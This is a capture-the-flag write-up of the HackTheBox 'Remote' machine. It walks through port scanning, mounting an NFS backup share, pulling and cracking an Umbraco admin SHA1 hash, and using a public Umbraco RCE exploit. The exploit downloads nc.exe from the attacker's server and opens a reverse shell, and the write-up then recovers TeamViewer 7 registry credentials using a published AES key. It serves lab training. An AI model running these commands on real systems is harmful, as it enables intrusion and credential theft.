# Remote | HackTheBox

### 1. Scan
```bash
kali@kali:~/Desktop$ nmap -A -T4 -p- 10.10.10.180
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-30 02:00 EDT
Nmap scan report for 10-10-10-180.tpgi.com.au (10.10.10.180)
Host is up (0.34s latency).
Not shown: 65517 closed ports
PORT      STATE    SERVICE       VERSION
21/tcp    open     ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open     rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?
2049/tcp  open     mountd        1-3 (RPC #100005)
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                                            
|_http-title: Not Found                                                                                                                                                                
28758/tcp filtered unknown                                                                                                                                                             
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                                               
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                                            
|_http-title: Not Found
48896/tcp filtered unknown
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49678/tcp open     msrpc         Microsoft Windows RPC
49679/tcp open     msrpc         Microsoft Windows RPC
49680/tcp open     msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4m36s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-30T06:33:36
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1913.81 seconds
```
The scan shows that the target is running a Windows OS and has FTP, RPC, NFS, three HTTP services, and some other services related to NFS operation (mountd, nlockmgr).

### 2. Enumerate HTTP services
The web server on port 80 is serving what looks to be just a basic template for an Umbraco CMS website. It all appears to be completely default stuff. Getting through to the admin panel (http://10.10.10.180/umbraco) would be desirable, but with no credentials and not much else to go on, I move on.  
Dirbuster output:  
```bash
kali@kali:~/Desktop$ dirb http://10.10.10.180/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Jun 30 02:12:28 2020
URL_BASE: http://10.10.10.180/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.180/ ----
+ http://10.10.10.180/about-us (CODE:200|SIZE:5441)      
+ http://10.10.10.180/blog (CODE:200|SIZE:5001)           
+ http://10.10.10.180/Blog (CODE:200|SIZE:5001)           
+ http://10.10.10.180/contact (CODE:200|SIZE:7880)     
+ http://10.10.10.180/Contact (CODE:200|SIZE:7880)     
+ http://10.10.10.180/home (CODE:200|SIZE:6703)        
+ http://10.10.10.180/Home (CODE:200|SIZE:6703)       
+ http://10.10.10.180/install (CODE:302|SIZE:126)
+ http://10.10.10.180/intranet (CODE:200|SIZE:3323)
+ http://10.10.10.180/master (CODE:500|SIZE:3420)
+ http://10.10.10.180/people (CODE:200|SIZE:6739)
+ http://10.10.10.180/People (CODE:200|SIZE:6739)
+ http://10.10.10.180/person (CODE:200|SIZE:2741)
+ http://10.10.10.180/product (CODE:500|SIZE:3420)
+ http://10.10.10.180/products (CODE:200|SIZE:5328)                                                                         
+ http://10.10.10.180/Products (CODE:200|SIZE:5328)                                                     
+ http://10.10.10.180/umbraco (CODE:200|SIZE:4040)
```

### 3. Enumerate NFS
MSF NFS enumeration module:
```bash
msf5 auxiliary(scanner/nfs/nfsmount) > run

[+] 10.10.10.180:111      - 10.10.10.180 NFS Export: /site_backups []
[*] 10.10.10.180:111      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
The scan module reveals one NFS share called "site_backups".  
Connect to the discovered share:
```bash
kali@kali:~$ sudo mkdir -p /mnt/site_backups
kali@kali:~$ sudo mount -t nfs 10.10.10.180:/site_backups /mnt/site_backups/ -o nolock
kali@kali:~$ cd /mnt/site_backups/; ls
App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config
```
From here we can start looking through the various files in this site_backups share. As expected, it's a backup of the Umbraco site, including the CMS files. By searching online, we can discover that the App_data/Umbraco.sdf file is a database that should contain the user credentials. I decide to strings the file first.
```bash
kali@kali:/mnt/site_backups/App_Data$ cp Umbraco.sdf /home/kali/Desktop/htb/remote/
kali@kali:/mnt/site_backups/App_Data$ cd ~/Desktop/htb/remote
kali@kali:~/Desktop/htb/remote$ strings Umbraco.sdf | grep password
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "smith" <smith@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "ssmith" <ssmith@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
passwordConfig
kali@kali:~/Desktop/htb/remote$ 
```
This looks promising, except I can't see any passwords. I try opening the database with some third-party tools - none of them work, they all say the database is corrupted. I go back and check some more files in the share, and find the security settings:
```bash
kali@kali:/mnt/site_backups$ cat Web.config
...
<add name="UmbracoMembershipProvider" type="Umbraco.Web.Security.Providers.MembersMembershipProvider, Umbraco" minRequiredNonalphanumericCharacters="0" minRequiredPasswordLength="5" useLegacyEncoding="true" enablePasswordRetrieval="false" enablePasswordReset="false" requiresQuestionAndAnswer="false" defaultMemberTypeAlias="Member" passwordFormat="Hashed" allowManuallyChangingPassword="false" />
...
```
The legacy password encoding scheme is being used, and the passwords are being hashed. Reference: https://our.umbraco.com/documentation/reference/security/Security-settings/  
Literally every tool I try to read the database with fails. Eventually whilst sifting through the raw binary, I find the following at the head of the file:
```bash
kali@kali:~/Desktop/htb/remote$ head Umbraco.sdf -n 100
��V�t�t�y���Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d��׃rf�u�rf�v�rf���rf����X�v�������adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50��BiIf�hVg�v�rf�hVg����X�v�������adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f�[{"alias":"umbIntroIntroduction","completed":false,"disabled":true}]��?�g�.og���g����X�v�������smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e��?�g�Ag�.og�Og����Y�w�������ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749��~�
g�)�
g�.og�7�
g����Z�x�������ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32��#���0�▒ A$C=H�DY^`FnyPH���I�� K��PM��
�@▒`Cpr�G��PLUHUH�4�-`��II AEEqDD���|   5!
��Eq
...
```
There is one SHA1 hash here: admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa

### 3. Crack the SHA1 hash
```bash
kali@kali:~/Desktop/htb/remote$ hashcat -a 0 -m 100 b8be16afba8c314ad33d812f22a04991b90e2aaa /usr/share/wordlists/rockyou.txt --force
hashcat (v6.0.0) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-7500U CPU @ 2.70GHz, 1424/1488 MB (512 MB allocatable), 4MCU

/home/kali/.hashcat/hashcat.dictstat2: Outdated header version, ignoring content
Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 3 secs

b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: SHA1
Hash.Target......: b8be16afba8c314ad33d812f22a04991b90e2aaa
Time.Started.....: Tue Jun 30 04:25:32 2020, (6 secs)
Time.Estimated...: Tue Jun 30 04:25:38 2020, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1840.7 kH/s (0.39ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 9826304/14344385 (68.50%)
Rejected.........: 0/9826304 (0.00%)
Restore.Point....: 9822208/14344385 (68.47%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: badboi56 -> bacano1106

Started: Tue Jun 30 04:24:45 2020
Stopped: Tue Jun 30 04:25:40 2020
```

### 4. Access the admin panel and enumerate some more
The admin panel can now be accessed with admin@htb.local:baconandcheese.  
Looking through the admin panel, there is not much we didn't already find by going through the backups: there is 2 users - admin and ssmith. There is not much to the interface, though there is an upload file facility. The server is running Umbraco version 7.12.4 (assembly: 1.0.6879.21982), which means my previously-mentioned exploit is out of the question. However, another search for this version shows another recent exploit: https://github.com/noraj/Umbraco-RCE. This can be attempted.  
I edit the script to tailor it to target and simplify it a bit, and then try running ipconfig.
```bash
kali@kali:~/Desktop/htb/remote/Umbraco-RCE$ python3 exploit.py ipconfig
Running: powershell.exe -Command ipconfig
Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : dead:beef::d41:83fd:7923:988f
   Link-local IPv6 Address . . . . . : fe80::d41:83fd:7923:988f%13
   IPv4 Address. . . . . . . . . . . : 10.10.10.180
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:30b0%13
                                       10.10.10.2
```
Some further enumeration: printing the current directory
```bash
kali@kali:~/Desktop/htb/remote/Umbraco-RCE$ python3 exploit.py pwd
Running: powershell.exe -Command ls
Path                       
----                       
C:\windows\system32\inetsrv
```
Though probably not intended until after I get the shell, I can read the user flag from here.
```bash
kali@kali:~/Desktop/htb/remote/Umbraco-RCE$ python3 exploit.py Get-Content C:/Users/Public/user.txt
Running: powershell.exe -Command Get-Content C:/Users/Public/user.txt
```
### 5. Get a shell
To get a shell, I use Invoke-WebRequest to upload Netcat to the target, and then connect back to my machine to give myself a shell.
```bash
kali@kali:~/Desktop/htb/remote/Umbraco-RCE$ python3 exploit.py Invoke-WebRequest -OutFile C:/Users/Public/nc.exe -Uri http://10.10.14.45:8000/nc.exe
Running: powershell.exe -Command Invoke-WebRequest -OutFile C:/Users/Public/nc.exe -Uri http://10.10.14.45:8000/nc.exe

kali@kali:~/Desktop/htb/remote/Umbraco-RCE$ python3 exploit.py ls C:/Users/Public
Running: powershell.exe -Command ls C:/Users/Public


    Directory: C:\Users\Public


Mode                LastWriteTime         Length Name
----                -------------         ------ ----      
d-r---        2/19/2020   3:03 PM                Documents 
d-r---        9/15/2018   3:19 AM                Downloads 
d-r---        9/15/2018   3:19 AM                Music     
d-r---        9/15/2018   3:19 AM                Pictures  
d-r---        9/15/2018   3:19 AM                Videos    
-a----        6/30/2020   5:58 AM          59392 nc.exe    
-ar---        6/30/2020   5:09 AM             34 user.txt  



kali@kali:~/Desktop/htb/remote/Umbraco-RCE$ python3 exploit.py C:/Users/Public/nc.exe -e cmd 10.10.14.45 4444
Running: powershell.exe -Command C:/Users/Public/nc.exe -e cmd 10.10.14.45 4444
```
Check nc:
```sh
kali@kali:~$ nc -lvp 4444
Listening on 0.0.0.0 4444
Connection received on 10-10-10-180.tpgi.com.au 49707
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```
### 6. Enumerate some more
System Info:
```sh
C:\Program Files (x86)>systeminfo
systeminfo

Host Name:                 REMOTE
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00429-00521-62775-AA801
Original Install Date:     2/19/2020, 4:03:29 PM
System Boot Time:          6/30/2020, 5:07:30 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              4 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [03]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [04]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,755 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 3,388 MB
Virtual Memory: In Use:    1,411 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 5 Hotfix(s) Installed.
                           [01]: KB4534119
                           [02]: KB4462930
                           [03]: KB4516115
                           [04]: KB4523204
                           [05]: KB4464455
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.180
                                 [02]: fe80::d41:83fd:7923:988f
                                 [03]: dead:beef::d41:83fd:7923:988f
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

C:\Program Files (x86)>

```
Applications:
```sh
C:\Program Files (x86)>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE23-EB3E

 Directory of C:\Program Files (x86)

02/23/2020  03:19 PM    <DIR>          .
02/23/2020  03:19 PM    <DIR>          ..
09/15/2018  03:28 AM    <DIR>          Common Files
09/15/2018  05:06 AM    <DIR>          Internet Explorer
02/23/2020  03:19 PM    <DIR>          Microsoft SQL Server
02/23/2020  03:15 PM    <DIR>          Microsoft.NET
02/19/2020  04:11 PM    <DIR>          MSBuild
02/19/2020  04:11 PM    <DIR>          Reference Assemblies
02/20/2020  03:14 AM    <DIR>          TeamViewer
09/15/2018  05:05 AM    <DIR>          Windows Defender
09/15/2018  03:19 AM    <DIR>          Windows Mail
10/29/2018  06:39 PM    <DIR>          Windows Media Player
09/15/2018  03:19 AM    <DIR>          Windows Multimedia Platform
09/15/2018  03:28 AM    <DIR>          windows nt
10/29/2018  06:39 PM    <DIR>          Windows Photo Viewer
09/15/2018  03:19 AM    <DIR>          Windows Portable Devices
09/15/2018  03:19 AM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              17 Dir(s)  19,405,238,272 bytes free

C:\Program Files (x86)>
```
Path:
```sh
C:\Program Files (x86)\TeamViewer\Version7>echo %path%     
echo %path%
C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps
```
Users:
```sh
C:\Program Files (x86)>net users
net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
WDAGUtilityAccount       
The command completed with one or more errors.


C:\Program Files (x86)>whoami
whoami
iis apppool\defaultapppool

C:\Program Files (x86)>echo %username%
echo %username%
REMOTE$

C:\Program Files (x86)>
```
Connections:
```sh
C:\>netstat -ano
netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       2708
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:111            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       912
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       480
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1080
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1592
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2596
  TCP    0.0.0.0:49678          0.0.0.0:0              LISTENING       616
  TCP    0.0.0.0:49679          0.0.0.0:0              LISTENING       640
  TCP    0.0.0.0:49680          0.0.0.0:0              LISTENING       2248
  TCP    10.10.10.180:80        10.10.14.45:35970      CLOSE_WAIT      4
  TCP    10.10.10.180:80        10.10.14.45:36070      ESTABLISHED     4
  TCP    10.10.10.180:139       0.0.0.0:0              LISTENING       4
  TCP    10.10.10.180:2049      0.0.0.0:0              LISTENING       4
  TCP    10.10.10.180:2049      10.10.14.45:688        ESTABLISHED     4
  TCP    10.10.10.180:2049      10.10.14.90:829        ESTABLISHED     4
  TCP    10.10.10.180:2049      10.10.15.45:1001       ESTABLISHED     4
  TCP    10.10.10.180:49707     10.10.14.45:4444       ESTABLISHED     800
  TCP    127.0.0.1:2049         0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:5939         0.0.0.0:0              LISTENING       3048
  TCP    [::]:21                [::]:0                 LISTENING       2708
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:111               [::]:0                 LISTENING       4
  TCP    [::]:135               [::]:0                 LISTENING       912
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       480
  TCP    [::]:49665             [::]:0                 LISTENING       1080
  TCP    [::]:49666             [::]:0                 LISTENING       1592
  TCP    [::]:49667             [::]:0                 LISTENING       2596
  TCP    [::]:49678             [::]:0                 LISTENING       616
  TCP    [::]:49679             [::]:0                 LISTENING       640
  TCP    [::]:49680             [::]:0                 LISTENING       2248
  TCP    [::1]:2049             [::]:0                 LISTENING       4
  TCP    [dead:beef::d41:83fd:7923:988f]:2049  [::]:0                 LISTENING       4
  TCP    [fe80::d41:83fd:7923:988f%13]:2049  [::]:0                 LISTENING       4
  UDP    0.0.0.0:123            *:*                                    2924
  UDP    0.0.0.0:500            *:*                                    2256
  UDP    0.0.0.0:4500           *:*                                    2256
  UDP    0.0.0.0:5353           *:*                                    1700
  UDP    0.0.0.0:5355           *:*                                    1700
  UDP    0.0.0.0:56075          *:*                                    1700
  UDP    10.10.10.180:111       *:*                                    4
  UDP    10.10.10.180:137       *:*                                    4
  UDP    10.10.10.180:138       *:*                                    4
  UDP    10.10.10.180:2049      *:*                                    4
  UDP    127.0.0.1:111          *:*                                    4
  UDP    127.0.0.1:2049         *:*                                    4
  UDP    127.0.0.1:50903        *:*                                    3216
  UDP    [::]:123               *:*                                    2924
  UDP    [::]:500               *:*                                    2256
  UDP    [::]:4500              *:*                                    2256
  UDP    [::]:5353              *:*                                    1700
  UDP    [::]:5355              *:*                                    1700
  UDP    [::]:56075             *:*                                    1700
  UDP    [::1]:111              *:*                                    4
  UDP    [::1]:2049             *:*                                    4
  UDP    [dead:beef::d41:83fd:7923:988f]:111  *:*                                    4
  UDP    [dead:beef::d41:83fd:7923:988f]:2049  *:*                                    4
  UDP    [fe80::d41:83fd:7923:988f%13]:111  *:*                                    4
  UDP    [fe80::d41:83fd:7923:988f%13]:2049  *:*                                    4
```  
Uploading JAWS enumeration script:
```bash
kali@kali:~/Desktop/htb/remote/Umbraco-RCE$ python3 exploit.py Invoke-WebRequest -OutFile C:/Users/Public/jaws.ps1 -Uri http://10.10.14.45:8000/jaws.ps1
Running: powershell.exe -Command Invoke-WebRequest -OutFile C:/Users/Public/jaws.ps1 -Uri http://10.10.14.45:8000/jaws.ps1
```
I then run it on the target and save the output.
```sh
C:\Users\Public>type jaws.txt
type jaws.txt
############################################################
##     J.A.W.S. (Just Another Windows Enum Script)        ##
##                                                        ##
##           https://github.com/411Hall/JAWS              ##
##                                                        ##
############################################################

Windows Version: Microsoft Windows Server 2019 Standard
Architecture: x86
Hostname: REMOTE
Current User: REMOTE$
Current Time\Date: 06/30/2020 06:19:44
```
(see jaws.txt for the full output)  
The one thing that stood out to me now was that the TeamViewer version that was shown to be running was version 7. This is quite old and immediately sends up red flags.
```sh
C:\Program Files (x86)\TeamViewer\Version7>type TeamViewer7_Logfile.log
type TeamViewer7_Logfile.log
                             
Start:              2020/02/27 10:35:08.063
Version:            7.0.43148
ID:                 1769137322
License:            0
Server:             master15.teamviewer.com
IC:                 301094961
OS:                 Win_6.2.9200_S (64-bit)
IP:                 10.10.10.180
MID:                u4e3239422ff60430196c056de763d7ad005056b94232827b61ef3f600f5ab8328e264ff7812d
MIDv:               1
Proxy-Settings:     Type=1 IP= User=
IE:                 9.11.17763.0
AppPath:            C:\Program Files (x86)\TeamViewer\Version7\TeamViewer_Service.exe
UserAccount:        SYSTEM
...
```
Service query:
```sh
PS C:\Users\Public> sc.exe qc TeamViewer7
sc.exe qc TeamViewer7
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: TeamViewer7
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files (x86)\TeamViewer\Version7\TeamViewer_Service.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : TeamViewer 7
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```
At this point I started digging deeper into vulnerabilities with this service and found some good stuff:
- https://whynotsecurity.com/blog/teamviewer/
- https://nvd.nist.gov/vuln/detail/CVE-2019-18988
  
*TL;DR: TeamViewer stored user passwords encrypted with AES-128-CBC with they key of 0602000000a400005253413100040000 and iv of 0100010067244F436E6762F25EA8D704 in the Windows registry. If the password is reused anywhere, privilege escalation is possible. If you do not have RDP rights to machine but TeamViewer is installed, you can use TeamViewer to remote in. TeamViewer also lets you copy data or schedule tasks to run through their Service, which runs as NT AUTHORITY\SYSTEM, so a low privilege user can immediately go to SYSTEM with a .bat file. This was assigned CVE-2019-18988..*
  
Retrieve the registry key:
```sh
PS C:\Users\Public> reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7
    StartMenuGroup    REG_SZ    TeamViewer 7
    InstallationDate    REG_SZ    2020-02-20
    InstallationDirectory    REG_SZ    C:\Program Files (x86)\TeamViewer\Version7
    Always_Online    REG_DWORD    0x1
    Security_ActivateDirectIn    REG_DWORD    0x0
    Version    REG_SZ    7.0.43148
    ClientIC    REG_DWORD    0x11f25831
    PK    REG_BINARY    BFAD2AEDB6C89AE0A0FD0501A0C5B9A5C0D957A4CC57C1884C84B6873EA03C069CF06195829821E28DFC2AAD372665339488DD1A8C85CDA8B19D0A5A2958D86476D82CA0F2128395673BA5A39F2B875B060D4D52BE75DB2B6C91EDB28E90DF7F2F3FBE6D95A07488AE934CC01DB8311176AEC7AC367AB4332ABD048DBFC2EF5E9ECC1333FC5F5B9E2A13D4F22E90EE509E5D7AF4935B8538BE4A606AB06FE8CC657930A24A71D1E30AE2188E0E0214C8F58CD2D5B43A52549F0730376DD3AE1DB66D1E0EBB0CF1CB0AA7F133148D1B5459C95A24DDEE43A76623759017F21A1BC8AFCD1F56FD0CABB340C9B99EE3828577371B7ADA9A8F967A32ADF6CF062B00026C66F8061D5CFF89A53EAE510620BC822BC6CC615D4DE093BC0CA8F5785131B75010EE5F9B6C228E650CA89697D07E51DBA40BF6FC3B2F2E30BF6F1C01F1BC2386FA226FFFA2BE25AE33FA16A2699A1124D9133F18B50F4DB6EDA2D23C2B949D6D2995229BC03507A62FCDAD55741B29084BD9B176CFAEDAAA9D48CBAF2C192A0875EC748478E51156CCDD143152125AE7D05177083F406703ED44DCACCD48400DD88A568520930BED69FCD672B15CD3646F8621BBC35391EAADBEDD04758EE8FC887BACE6D8B59F61A5783D884DBE362E2AC6EAC0671B6B5116345043257C537D27A8346530F8B7F5E0EBACE9B840E716197D4A0C3D68CFD2126E8245B01E62B4CE597AA3E2074C8AB1A4583B04DBB13F13EB54E64B850742A8E3E8C2FAC0B9B0CF28D71DD41F67C773A19D7B1A2D0A257A4D42FC6214AB870710D5E841CBAFCD05EF13B372F36BF7601F55D98ED054ED0F321AEBA5F91D390FF0E8E5815E6272BA4ABB3C85CF4A8B07851903F73317C0BC77FA12A194BB75999319222516
    SK    REG_BINARY    F82398387864348BAD0DBB41812782B1C0ABB9DAEEF15BC5C3609B2C5652BED7A9A07EA41B3E7CB583A107D39AFFF5E06DF1A06649C07DF4F65BD89DE84289D0F2CBF6B8E92E7B2901782BE8A039F2903552C98437E47E16F75F99C07750AEED8CFC7CD859AE94EC6233B662526D977FFB95DD5EB32D88A4B8B90EC1F8D118A7C6D28F6B5691EB4F9F6E07B6FE306292377ACE83B14BF815C186B7B74FFF9469CA712C13F221460AC6F3A7C5A89FD7C79FF306CEEBEF6DE06D6301D5FD9AB797D08862B9B7D75B38FB34EF82C77C8ADC378B65D9ED77B42C1F4CB1B11E7E7FB2D78180F40C96C1328970DA0E90CDEF3D4B79E08430E546228C000996D846A8489F61FE07B9A71E7FB3C3F811BB68FDDF829A7C0535BA130F04D9C7C09B621F4F48CD85EA97EF3D79A88257D0283BF2B78C5B3D4BBA4307D2F38D3A4D56A2706EDAB80A7CE20E21099E27481C847B49F8E91E53F83356323DDB09E97F45C6D103CF04693106F63AD8A58C004FC69EF8C506C553149D038191781E539A9E4E830579BCB4AD551385D1C9E4126569DD96AE6F97A81420919EE15CF125C1216C71A2263D1BE468E4B07418DE874F9E801DA2054AD64BE1947BE9580D7F0E3C138EE554A9749C4D0B3725904A95AEBD9DACCB6E0C568BFA25EE5649C31551F268B1F2EC039173B7912D6D58AA47D01D9E1B95E3427836A14F71F26E350B908889A95120195CC4FD68E7140AA8BB20E211D15C0963110878AAB530590EE68BF68B42D8EEEB2AE3B8DEC0558032CFE22D692FF5937E1A02C1250D507BDE0F51A546FE98FCED1E7F9DBA3281F1A298D66359C7571D29B24D1456C8074BA570D4D0BA2C3696A8A9547125FFD10FBF662E597A014E0772948F6C5F9F7D0179656EAC2F0C7F
    LastMACUsed    REG_MULTI_SZ    \0005056B90E33
